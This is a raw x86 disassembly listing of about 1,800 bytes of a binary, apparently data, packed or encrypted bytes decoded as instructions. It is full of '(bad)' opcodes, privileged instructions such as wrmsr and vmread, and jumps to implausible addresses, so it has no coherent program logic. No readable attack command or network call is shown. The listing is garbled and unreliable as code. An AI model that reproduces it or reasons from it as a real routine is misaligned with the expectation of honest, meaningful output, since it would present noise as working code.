  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
